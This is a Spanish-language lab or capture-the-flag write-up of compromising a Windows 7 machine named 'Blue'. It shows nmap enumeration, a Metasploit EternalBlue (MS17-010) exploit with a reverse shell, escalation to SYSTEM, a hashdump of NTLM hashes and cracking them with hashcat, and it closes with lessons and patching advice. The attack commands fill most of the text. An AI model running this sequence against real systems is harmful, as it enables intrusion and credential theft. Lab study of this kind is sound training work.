
---

## 📌 Información General

- **Máquina:** Blue
    
- **Sistema Operativo:** Windows 7 SP1
    
- **Vulnerabilidad explotada:** MS17-010 (EternalBlue)
    
- **Acceso obtenido:** NT AUTHORITY\SYSTEM
    
- **Tipo de ataque:** RCE vía SMB → Escalada de privilegios → Dump de hashes → Cracking NTLM

---

# 1️⃣ Enumeración

## 🔎 Escaneo inicial con Nmap

```bash
nmap -sC -sV -p- 10.113.129.25
```

### Hallazgos relevantes

- 445/tcp open → SMB
    
- Windows 7 Professional SP1 detectado
    
- SMBv1 habilitado
    

Windows 7 + SMBv1 es una combinación clásica vulnerable a **MS17-010**.

---

# 2️⃣ Explotación – MS17-010 (EternalBlue)

## 🚀 Inicio de Metasploit

```bash
msfconsole
```

Salida inicial observada:

```
=[ metasploit v6.4.112-dev ]
+ -- --=[ 2,607 exploits - 1,325 auxiliary - 1,707 payloads ]
```

---

## 🔍 Búsqueda del exploit

```bash
search ms17
```

Resultado relevante:

```
exploit/windows/smb/ms17_010_eternalblue
```

---

## 🎯 Configuración y ejecución

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.113.129.25
set LHOST 192.168.128.183
set payload windows/x64/shell/reverse_tcp
run
```

Se obtiene una **shell reversa** tras ejecución exitosa.

---

# 3️⃣ Conversión a Meterpreter

Se utiliza el módulo post:

```
post/multi/manage/shell_to_meterpreter
```

```bash
run
```

Salida clave:

```
[*] Upgrading session ID: 1
[*] Meterpreter session 2 opened
```

Interactuamos:

```bash
sessions -i 2
```

Ahora contamos con sesión **Meterpreter completa**.

---

# 4️⃣ Escalada de Privilegios

```bash
getsystem
shell
whoami
```

Resultado:

```
nt authority\system
```

Confirmamos privilegios **SYSTEM**.

---

# 5️⃣ Migración de Proceso

Listado de procesos:

```bash
ps
```

Ejemplo de procesos SYSTEM detectados:

```
692   services.exe      NT AUTHORITY\SYSTEM
700   lsass.exe         NT AUTHORITY\SYSTEM
2144  powershell.exe    NT AUTHORITY\SYSTEM
```

Migración:

```bash
migrate 692
```

Esto estabiliza la sesión.

---

# 6️⃣ Dump de Hashes

```bash
hashdump
```

Salida obtenida:

```
Administrator:500:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:...:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Hash relevante:

```
ffb43f0de35be4d9917ac0cc8ad57f8d
```

Ubicación del SAM:

```
C:\Windows\System32\config\SAM
```

---

# 7️⃣ Cracking del Hash con Hashcat

```bash
nano hash.txt
```

```bash
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```

### Parámetros utilizados

- `-m 1000` → NTLM
    
- `-a 0` → Ataque por diccionario
    
- `rockyou.txt` → Wordlist
    

Resultado:

```
ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
```

### Contraseña descifrada

```
alqfna22
```

---

# 8️⃣ Obtención de Flags

## 🏁 Flag 1 – Raíz del sistema

```bash
type C:\flag1.txt
```

---

## 🏁 Flag 2 – Ubicación del SAM

```bash
cd C:\Windows\System32\config
type flag2.txt
```

Contenido observado:

```
flag{sam_database_elevated_access}
```

---

## 🏁 Flag 3 – Perfil de usuario

```bash
cd C:\Users\Jon\Desktop
dir
```

Localizar `flag3.txt` en dicha ubicación.

---

# 🧠 Lecciones Aprendidas

- SMBv1 representa un riesgo crítico en entornos legacy.
    
- EternalBlue sigue siendo explotable en sistemas sin parches.
    
- NTLM con contraseñas débiles es trivialmente crackeable.
    
- Migrar proceso es clave para estabilidad en post-explotación.
    
- Meterpreter facilita automatización y escalada completa.
    

---

# 🛡 Recomendaciones de Seguridad

- Deshabilitar SMBv1
    
- Aplicar parches MS17-010
    
- Implementar contraseñas robustas
    
- Monitorizar tráfico SMB anómalo
    
- Segmentar red interna
    

---

# 🧰 Herramientas Utilizadas

- [[Nmap]]
    
- [[Metasploit]] Framework
    
- [[Meterpreter]]
    
- [[Hashcat]]
    
- Rockyou Wordlist

---

**Estado final:** Compromiso total del sistema con privilegios SYSTEM y extracción de credenciales completada.